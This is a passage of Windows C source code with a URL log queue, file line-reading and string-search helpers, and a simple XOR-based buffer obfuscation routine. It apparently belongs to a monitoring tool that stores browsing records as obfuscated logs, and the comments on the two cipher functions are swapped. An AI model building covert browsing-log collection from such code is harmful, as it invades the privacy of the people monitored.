	if(!bRet)
		znfree((LPVOID*)&lpcEvBuffer);

	return bRet;
}


//add the log to the log array
int URL_QueueLog(LPBYTE lpcEvBuf, DWORD dwEvSize)
{
	DWORD i;

	for(i=0; i<MAX_URL_QUEUE; i++)
	{
		if(g_lpURLLogs[i].dwSize == 0 || g_lpURLLogs[i].lpBuffer == NULL)
		{
			g_lpURLLogs[i].dwSize	= dwEvSize;
			g_lpURLLogs[i].lpBuffer = lpcEvBuf;

			return TRUE;
		}
	}

	#ifdef _DEBUG
	OutputDebugString(L"[URL] Log is full");
	#endif

	return FALSE;
}


//read a line till the \r\n char
BOOL File_ReadLine(HANDLE hFile, LPSTR* lpszBuffer)
{
	char  cChar = 0;
	BOOL  bRet = TRUE;
	DWORD dwStart = 0, dwRd = 0;
	long  nCnt;

	//dealloc the memory
	znfree((LPVOID*)lpszBuffer);
	
	//read untill the LF char or untill the EOF
	for(nCnt=0; (bRet==TRUE) && (cChar != '\n'); nCnt++)
	{
		//read 1 byte
		bRet = ReadFile(hFile, &cChar, 1, &dwRd, NULL);
		if(bRet == FALSE)
			continue;

		//verify if EOF was reached
		if((cChar == 0) || (cChar == EOF))
			return FALSE;

		//verify the read byte
		if(cChar != '\n')
			continue;

		nCnt += 1;

		//set the file pointer to the beginning of the line
		dwStart = SetFilePointer(hFile, -nCnt, 0, FILE_CURRENT);
		if(dwStart == INVALID_SET_FILE_POINTER)
			return FALSE;

		//alloc memory for the new string
		*lpszBuffer = (LPSTR)malloc(nCnt + 1);
		if(*lpszBuffer == NULL)
			return FALSE;		
		memset(*lpszBuffer, 0, nCnt + 1);

		//read the line
		bRet = ReadFile(hFile, *lpszBuffer, nCnt, &dwRd, NULL);
		if(bRet == TRUE)
			break;
	}

	return bRet;
}


//parse the file to find the specified string
LPSTR File_SearchString(HANDLE hFile, LPSTR lpszStr)
{
	LPSTR lpszBuf = NULL;
	DWORD dwSize = 0;
	BOOL  bRet = FALSE;

	//verify the file handle
	if(hFile == INVALID_HANDLE_VALUE)
		return NULL;
	
	do
	{
		//read a line
		bRet = File_ReadLine(hFile, &lpszBuf);
		if(bRet == FALSE)
		{
			znfree((LPVOID*)&lpszBuf);
			return NULL;
		}

		//search the substring
		if(strstr(lpszBuf, lpszStr) != NULL)
			break;
	}
	while(bRet);

	return lpszBuf;
}


//buffer encryption
void DecryptBuffer(LPBYTE lpBuf, DWORD dwSize)
{
	DWORD i;

	for(i=0; i<dwSize; i++)
	{
		lpBuf[i] ^= 0x86;
		lpBuf[i] += (BYTE)i;
		lpBuf[i] ^= (BYTE)i+8;		
	}
}


//buffer decryption
void EncryptBuffer(LPBYTE lpBuf, DWORD dwSize)
{
	DWORD i;

	for(i=0; i<dwSize; i++)
	{		
		lpBuf[i] ^= (BYTE)i+8;
		lpBuf[i] -= (BYTE)i;		
		lpBuf[i] ^= 0x86;
	}
}